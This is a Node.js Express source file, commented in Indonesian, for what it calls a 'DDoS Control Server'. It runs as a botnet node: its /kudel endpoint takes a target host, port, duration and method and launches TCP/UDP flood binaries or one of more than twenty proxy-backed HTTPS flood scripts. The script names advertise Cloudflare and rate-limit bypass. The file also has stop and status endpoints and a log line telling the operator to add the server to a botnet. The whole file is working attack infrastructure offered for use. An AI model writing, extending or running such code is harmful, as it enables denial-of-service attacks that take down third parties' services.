const express = require('express');
const { exec, spawn, execFile } = require('child_process');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const os = require('os');
const net = require('net');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Menyimpan proses serangan yang sedang berjalan
const activeAttacks = new Map();
const attackStatistics = new Map();

// Binary execution subsystem dengan validasi lengkap
class BinaryAttackExecutor {
    constructor() {
        this.binaryBasePath = path.join(__dirname, 'lib', 'cache');
        this.supportedBinaries = ['tcp', 'udp'];
        this.ensureDirectoryExists();
        this.validateBinaries();
    }

    ensureDirectoryExists() {
        if (!fs.existsSync(this.binaryBasePath)) {
            fs.mkdirSync(this.binaryBasePath, { recursive: true });
            console.log(`Created binary directory: ${this.binaryBasePath}`);
        }
    }

    validateBinaries() {
        console.log('Validating attack binaries...');
        
        this.supportedBinaries.forEach(binary => {
            const binaryPath = path.join(this.binaryBasePath, binary);
            const sourcePath = path.join(this.binaryBasePath, `${binary}.c`);
            
            // Check if binary exists and is executable
            if (fs.existsSync(binaryPath)) {
                try {
                    if (process.platform !== 'win32') {
                        const stats = fs.statSync(binaryPath);
                        const isExecutable = !!(stats.mode & fs.constants.S_IXUSR);
                        if (!isExecutable) {
                            console.log(`Setting execute permissions for ${binary}...`);
                            fs.chmodSync(binaryPath, 0o755);
                        }
                    }
                    console.log(`✓ Binary ${binary} validated successfully`);
                } catch (error) {
                    console.error(`✗ Error validating ${binary}:`, error.message);
                }
            } else {
                console.warn(`⚠ Binary ${binary} not found at ${binaryPath}`);
                
                // Check if source file exists for compilation
                if (fs.existsSync(sourcePath)) {
                    console.log(`Found source file for ${binary}, attempting compilation...`);
                    this.compileBinary(binary);
                } else {
                    console.error(`✗ Source file ${binary}.c not found at ${sourcePath}`);
                    console.log('Please ensure both .c files and compiled binaries are in lib/cache/ directory');
                }
            }
        });
    }

    compileBinary(binaryName) {
        const sourcePath = path.join(this.binaryBasePath, `${binaryName}.c`);
        const binaryPath = path.join(this.binaryBasePath, binaryName);
        
        if (!fs.existsSync(sourcePath)) {
            console.error(`✗ Source file not found for ${binaryName} at ${sourcePath}`);
            return false;
        }

        console.log(`🛠 Compiling ${binaryName} from source...`);
        
        const compileCommand = `gcc -o "${binaryPath}" "${sourcePath}" -O3 -Wall`;
        
        exec(compileCommand, (error, stdout, stderr) => {
            if (error) {
                console.error(`✗ Compilation failed for ${binaryName}:`, error.message);
                if (stderr) console.error(`Compiler errors:\n${stderr}`);
                return false;
            }
            
            if (stdout) console.log(`Compiler output: ${stdout}`);
            
            // Set execute permissions on Unix-like systems
            if (process.platform !== 'win32') {
                try {
                    fs.chmodSync(binaryPath, 0o755);
                    console.log(`✓ Execute permissions set for ${binaryName}`);
                } catch (chmodError) {
                    console.warn(`⚠ Could not set execute permissions: ${chmodError.message}`);
                }
            }
            
            console.log(`✓ Successfully compiled ${binaryName}`);
            return true;
        });
        
        return true;
    }

    executeBinaryAttack(binaryName, args, attackKey, targetInfo) {
        const binaryPath = path.join(this.binaryBasePath, binaryName);
        
        if (!fs.existsSync(binaryPath)) {
            console.error(`✗ Binary ${binaryName} not found at ${binaryPath}`);
            return null;
        }

        try {
            console.log(`🚀 Executing ${binaryName} attack with args: ${args.join(' ')}`);
            
            const childProcess = spawn(binaryPath, args, {
                detached: true,
                stdio: ['ignore', 'pipe', 'pipe'] // Capture stdout and stderr for debugging
            });

            // Track process output for debugging
            childProcess.stdout.on('data', (data) => {
                console.log(`[${binaryName} stdout]: ${data.toString().trim()}`);
            });

            childProcess.stderr.on('data', (data) => {
                console.error(`[${binaryName} stderr]: ${data.toString().trim()}`);
            });

            childProcess.on('error', (error) => {
                console.error(`✗ Error executing ${binaryName}:`, error.message);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                this.updateAttackStatus(attackKey, 'failed', error.message);
            });

            childProcess.on('exit', (code, signal) => {
                console.log(`[${binaryName}] Process exited with code ${code}, signal ${signal}`);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                const status = code === 0 ? 'completed' : 'failed';
                this.updateAttackStatus(attackKey, status, `Exit code: ${code}`);
            });

            childProcess.on('close', (code) => {
                console.log(`[${binaryName}] Process closed with code ${code}`);
            });

            // Store process information
            activeAttacks.set(attackKey, {
                process: childProcess,
                type: 'binary',
                binary: binaryName,
                args: args,
                startTime: Date.now(),
                target: targetInfo
            });

            this.updateAttackStatus(attackKey, 'running', 'Binary attack started');

            childProcess.unref();
            return childProcess;

        } catch (error) {
            console.error(`✗ Failed to spawn ${binaryName}:`, error.message);
            this.updateAttackStatus(attackKey, 'failed', error.message);
            return null;
        }
    }

    updateAttackStatus(attackKey, status, message = '') {
        if (attackStatistics.has(attackKey)) {
            const stats = attackStatistics.get(attackKey);
            stats.status = status;
            stats.endTime = status !== 'running' ? Date.now() : undefined;
            stats.message = message;
            if (stats.endTime && stats.startTime) {
                stats.actualDuration = stats.endTime - stats.startTime;
            }
        }
    }
}

// Initialize binary executor
const binaryExecutor = new BinaryAttackExecutor();

// Attack statistics tracker
class AttackStatistics {
    static trackAttack(attackKey, method, target, port, plannedDuration) {
        const stats = {
            startTime: Date.now(),
            method: method,
            target: target,
            port: port,
            plannedDuration: parseInt(plannedDuration) * 1000, // Convert to ms
            status: 'running',
            actualDuration: null,
            endTime: null,
            message: ''
        };
        attackStatistics.set(attackKey, stats);
        return stats;
    }

    static completeAttack(attackKey, status = 'completed', message = '') {
        if (attackStatistics.has(attackKey)) {
            const stats = attackStatistics.get(attackKey);
            stats.status = status;
            stats.endTime = Date.now();
            stats.actualDuration = stats.endTime - stats.startTime;
            stats.message = message;
        }
    }

    static getStats() {
        return Array.from(attackStatistics.entries());
    }

    static getActiveAttacks() {
        return Array.from(attackStatistics.entries())
            .filter(([key, stats]) => stats.status === 'running');
    }
}

// Fungsi untuk mengambil data dari API
async function fetchData() {
    try {
        const response = await axios.get('https://httpbin.org/get', {
            timeout: 10000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        const data = response.data;
        const serverUrl = `http://${data.origin}:${port}`;
        console.log(`🌐 Copy This Add To Botnet -> ${serverUrl}`);
        console.log(`🔗 API Endpoint: ${serverUrl}/kudel`);
        console.log(`⏹️ Stop Endpoint: ${serverUrl}/stop`);
        return data;
    } catch (error) {
        console.error('❌ Error fetching data:', error.message);
        // Fallback to local IP detection
        try {
            const interfaces = os.networkInterfaces();
            let localIp = 'localhost';
            
            Object.keys(interfaces).forEach(iface => {
                interfaces[iface].forEach(addr => {
                    if (addr.family === 'IPv4' && !addr.internal) {
                        localIp = addr.address;
                    }
                });
            });
            
            const serverUrl = `http://${localIp}:${port}`;
            console.log(`🌐 Local Server URL -> ${serverUrl}`);
            console.log(`🔗 API Endpoint: ${serverUrl}/kudel`);
            console.log(`⏹️ Stop Endpoint: ${serverUrl}/stop`);
            
            return { origin: localIp };
        } catch (fallbackError) {
            console.error('❌ Fallback IP detection failed:', fallbackError.message);
            return { origin: 'localhost' };
        }
    }
}

// Middleware untuk logging
app.use((req, res, next) => {
    console.log(`📨 ${new Date().toISOString()} ${req.method} ${req.url} from ${req.ip}`);
    next();
});

// Endpoint untuk menerima request serangan
app.get('/kudel', (req, res) => {
    const { host, port: targetPort, time, methods } = req.query;

    // Validasi parameter
    if (!host || !targetPort || !time || !methods) {
        return res.status(400).json({
            success: false,
            error: 'Missing required parameters: host, port, time, methods',
            example: '/kudel?host=example.com&port=80&time=60&methods=tcp'
        });
    }

    // Validasi waktu serangan (max 3600 detik = 1 jam)
    const attackTime = Math.min(parseInt(time), 3600);
    if (attackTime <= 0) {
        return res.status(400).json({
            success: false,
            error: 'Invalid time parameter. Must be positive number up to 3600 seconds'
        });
    }

    // Validasi port target
    const portNum = parseInt(targetPort);
    if (portNum < 1 || portNum > 65535) {
        return res.status(400).json({
            success: false,
            error: 'Invalid port number. Must be between 1 and 65535'
        });
    }

    // Respon ke client
    res.status(200).json({
        success: true,
        message: 'API request received. Executing attack shortly.',
        target: host,
        port: portNum,
        time: attackTime,
        methods: methods,
        attack_id: `${host}:${portNum}-${methods}-${Date.now()}`
    });

    console.log(`🎯 Received attack request: Method ${methods}, Target ${host}:${portNum}, Duration ${attackTime}s`);

    // Daftar metode serangan dengan binary support
    const attackMethods = {
        'https-cdn': `node ./lib/cache/https-cdn.js GET ${host} ${attackTime} 1 90 proxy.txt --cdn true --full --legit --randrate true`,
        'https-bypass': `node ./lib/cache/https-bypass.js ${host} ${attackTime} 1 proxy.txt 90`,
        'https-tlsv3': `node ./lib/cache/https-tlsv3.js  GET ${host} ${attackTime} 1 90 proxy.txt --delay 3`,
        'https-tlsv2': `node ./lib/cache/https-tlsv2.js hybride ${host} ${attackTime} 90 1 proxy.txt --method-ratio=0.5"`,
        
        // Binary attacks dengan parameter yang sesuai
        'tcp': {
            type: 'binary',
            binary: 'tcp',
            args: [host, targetPort, '1', '1024', attackTime.toString()]
        },
        
        'udp': {
            type: 'binary',
            binary: 'udp',
            args: [host, targetPort, attackTime.toString(), '1472', '1024']
        },
        
        'https-raw': `node ./lib/cache/https-raw.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-flood': `node ./lib/cache/https-flood.js ${host} ${attackTime} 90 1 proxy.txt --bfm true --fakebot true --autoratelimit true`,
        'https-uam': `node ./lib/cache/https-uam.js ${host} ${attackTime} 1http.txt`,
        'https-browser': `node ./lib/cache/browser.js ${host} ${attackTime} 30 --proxy http.txt --headers undetect`,
        'https-403': `node ./lib/cache/https-403.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-leak': `node ./lib/cache/https-leak.js --method GET --target ${host} --time ${attackTime} --rate 90 --threads 1 --proxy proxy.txt --http mix --full true --extra true --fingerprint true`,
        'https-cf': `node ./lib/cache/https-cf.js ${host} ${attackTime} 90 1 proxy.txt --all--bypass --all--full --all--extra --all-backend --all-redirect --all-fingerprint`,
        'https-tls': `node ./lib/cache/https-tls.js ${host} ${attackTime} 90 1 proxy.txt --bfm --origin --cache --spoof`,   
        'https-cve': `node ./lib/cache/https-cve.js GET "${host}" ${attackTime} 1 90 proxy.txt --ultra --http mix --referer rand --randrate `,
        'https-flooder': `node ./lib/cache/https-flooder.js ${host} ${attackTime} 1 90 proxy.txt`,
        'https-killcf': `node ./lib/cache/https-killcf.js ${host} ${attackTime} 1 90`,
        'https-spam': `node ./lib/cache/https-spam.js ${host} ${attackTime} 90 1`,
        'R2': `node ./lib/cache/R2.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-destroy': `node ./lib/cache/https-destroy.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-star': `node ./lib/cache/https-star.js GET ${host} ${attackTime} 1 90 proxy.txt --full --winter --http mix`,
        'https-light': `node ./lib/cache/https-light.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-super': `node ./lib/cache/https-super.js ${host} ${attackTime} 1 90`
    };

    // Fungsi untuk mengeksekusi perintah
    const executeAttack = (methodConfig, attackKey, methodName) => {
        const targetInfo = { host, port: targetPort, time: attackTime };
        
        if (typeof methodConfig === 'string') {
            // Node.js script execution
            console.log(`🟢 Executing Node.js script: ${methodConfig}`);
            
            const [command, ...args] = methodConfig.split(' ');
            const childProcess = spawn(command, args, {
                detached: true,
                stdio: 'ignore'
            });
            
            activeAttacks.set(attackKey, {
                process: childProcess,
                type: 'nodejs',
                script: methodConfig,
                startTime: Date.now(),
                target: targetInfo
            });
            
            AttackStatistics.trackAttack(attackKey, methodName, host, targetPort, attackTime);
            
            childProcess.on('error', (error) => {
                console.error(`❌ Error executing Node.js script:`, error.message);
                activeAttacks.delete(attackKey);
                AttackStatistics.completeAttack(attackKey, 'failed', error.message);
            });
            
            childProcess.on('exit', (code) => {
                console.log(`📊 Node.js script exited with code ${code}`);
                activeAttacks.delete(attackKey);
                AttackStatistics.completeAttack(attackKey, code === 0 ? 'completed' : 'failed', `Exit code: ${code}`);
            });
            
            childProcess.unref();
            return childProcess;
            
        } else if (methodConfig.type === 'binary') {
            // Binary execution
            return binaryExecutor.executeBinaryAttack(
                methodConfig.binary,
                methodConfig.args,
                attackKey,
                targetInfo
            );
        }
    };

    // Generate unique attack key
    const baseAttackKey = `${host}:${targetPort}-${methods}-${Date.now()}`;

    // Cek jika methods adalah mix (format: method1+method2+method3)
    if (methods.includes('+')) {
        const methodList = methods.split('+');
        
        // Batasi maksimal 5 metode
        const selectedMethods = methodList.slice(0, 5).map(method => ({
            name: method,
            config: attackMethods[method]
        })).filter(item => item.config !== undefined);
        
        if (selectedMethods.length > 0) {
            console.log(`🔀 Executing mix of ${selectedMethods.length} methods: ${selectedMethods.map(m => m.name).join(', ')}`);
            
            selectedMethods.forEach((method, index) => {
                const attackKey = `${baseAttackKey}-${index}`;
                AttackStatistics.trackAttack(attackKey, method.name, host, targetPort, attackTime);
                executeAttack(method.config, attackKey, method.name);
            });
            
        } else {
            console.log('❌ No valid methods found in mix');
        }
    } else {
        // Eksekusi metode tunggal
        const selectedMethod = attackMethods[methods];
        if (selectedMethod) {
            AttackStatistics.trackAttack(baseAttackKey, methods, host, targetPort, attackTime);
            executeAttack(selectedMethod, baseAttackKey, methods);
        } else {
            console.log(`❌ Unsupported method: ${methods}`);
            console.log(`📋 Supported methods: ${Object.keys(attackMethods).join(', ')}`);
        }
    }

    // Auto-cleanup setelah serangan selesai
    setTimeout(() => {
        if (activeAttacks.has(baseAttackKey)) {
            console.log(`🕒 Auto-cleaning attack ${baseAttackKey} after completion`);
            activeAttacks.delete(baseAttackKey);
        }
    }, attackTime * 1000 + 10000); // Waktu serangan + 10 detik buffer
});

// Endpoint untuk menghentikan serangan
app.get('/stop', (req, res) => {
    const { target, port, attack_id } = req.query;
    
    let stoppedCount = 0;
    let stoppedDetails = [];

    if (attack_id) {
        // Hentikan serangan spesifik berdasarkan ID
        if (activeAttacks.has(attack_id)) {
            try {
                const attack = activeAttacks.get(attack_id);
                attack.process.kill('SIGTERM');
                activeAttacks.delete(attack_id);
                AttackStatistics.completeAttack(attack_id, 'stopped', 'Manually stopped by API');
                stoppedCount++;
                stoppedDetails.push(attack_id);
                console.log(`⏹️ Stopped specific attack: ${attack_id}`);
            } catch (error) {
                console.error(`❌ Error stopping attack ${attack_id}:`, error.message);
            }
        }
        
        res.status(200).json({
            success: true,
            message: `Stopped ${stoppedCount} attacks for ID ${attack_id}`,
            stopped_attacks: stoppedDetails
        });
        
    } else if (target && port) {
        // Hentikan serangan spesifik berdasarkan target dan port
        for (const [key, attack] of activeAttacks.entries()) {
            if (key.includes(`${target}:${port}`)) {
                try {
                    attack.process.kill('SIGTERM');
                    activeAttacks.delete(key);
                    AttackStatistics.completeAttack(key, 'stopped', 'Manually stopped by API');
                    stoppedCount++;
                    stoppedDetails.push(key);
                    console.log(`⏹️ Stopped attack: ${key}`);
                } catch (error) {
                    console.error(`❌ Error stopping attack ${key}:`, error.message);
                }
            }
        }
        
        res.status(200).json({
            success: true,
            message: `Stopped ${stoppedCount} attacks for ${target}:${port}`,
            stopped_attacks: stoppedDetails
        });
    } else {
        // Hentikan semua serangan
        for (const [key, attack] of activeAttacks.entries()) {
            try {
                attack.process.kill('SIGTERM');
                activeAttacks.delete(key);
                AttackStatistics.completeAttack(key, 'stopped', 'Manually stopped by API');
                stoppedCount++;
                stoppedDetails.push(key);
                console.log(`⏹️ Stopped attack: ${key}`);
            } catch (error) {
                console.error(`❌ Error stopping attack ${key}:`, error.message);
            }
        }
        
        res.status(200).json({
            success: true,
            message: `Stopped all ${stoppedCount} attacks`,
            stopped_attacks: stoppedDetails
        });
    }
});

// Endpoint untuk status server
app.get('/status', (req, res) => {
    const activeCount = activeAttacks.size;
    const totalStats = AttackStatistics.getStats().length;
    const activeStats = AttackStatistics.getActiveAttacks();
    
    res.status(200).json({
        server_status: 'running',
        port: port,
        uptime: process.uptime(),
        active_attacks: activeCount,
        total_attacks_processed: totalStats,
        currently_active: activeStats.map(([key, stats]) => ({
            attack_id: key,
            method: stats.method,
            target: `${stats.target}:${stats.port}`,
            duration: `${Math.round((Date.now() - stats.startTime) / 1000)}s/${Math.round(stats.plannedDuration / 1000)}s`,
            status: stats.status
        })),
        memory_usage: process.memoryUsage()
    });
});

// Endpoint untuk info binary
app.get('/binaries', (req, res) => {
    const binaryInfo = {};
    
    binaryExecutor.supportedBinaries.forEach(binary => {
        const binaryPath = path.join(binaryExecutor.binaryBasePath, binary);
        const sourcePath = path.join(binaryExecutor.binaryBasePath, `${binary}.c`);
        
        binaryInfo[binary] = {
            exists: fs.existsSync(binaryPath),
            source_exists: fs.existsSync(sourcePath),
            path: binaryPath,
            executable: fs.existsSync(binaryPath) ? 
                (process.platform !== 'win32' ? 
                    !!(fs.statSync(binaryPath).mode & fs.constants.S_IXUSR) : 
                    true) : 
                false
        };
    });
    
    res.json({
        platform: process.platform,
        architecture: process.arch,
        binaries: binaryInfo
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        server: 'DDoS Control Server',
        version: '1.0.0'
    });
});

// Handle 404
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'Endpoint not found',
        available_endpoints: {
            attack: 'GET /kudel?host=target.com&port=80&time=60&methods=tcp',
            stop: 'GET /stop?target=host&port=80 OR /stop?attack_id=id',
            status: 'GET /status',
            binaries: 'GET /binaries',
            health: 'GET /health'
        }
    });
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('💥 Server error:', error);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: error.message
    });
});

// Graceful shutdown handling
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT. Shutting down gracefully...');
    
    // Stop all active attacks
    let stoppedCount = 0;
    for (const [key, attack] of activeAttacks.entries()) {
        try {
            attack.process.kill('SIGTERM');
            stoppedCount++;
        } catch (error) {
            console.error(`Error stopping attack ${key}:`, error.message);
        }
    }
    
    console.log(`⏹️ Stopped ${stoppedCount} active attacks`);
    console.log('👋 Server shutdown complete');
    process.exit(0);
});

// Jalankan server
app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
    console.log(`📍 Local URL: http://localhost:${port}`);
    console.log(`📊 Status endpoint: http://localhost:${port}/status`);
    console.log(`🛑 Stop endpoint: http://localhost:${port}/stop`);
    console.log('🔧 Validating system configuration...');
    
    // Initial system check
    setTimeout(() => {
        fetchData();
        console.log('✅ Server initialization complete');
        console.log('💡 Use /kudel endpoint to start attacks');
        console.log('💡 Use /binaries endpoint to check binary status');
    }, 1000);
});

// Export untuk testing
module.exports = { app, binaryExecutor, activeAttacks, attackStatistics };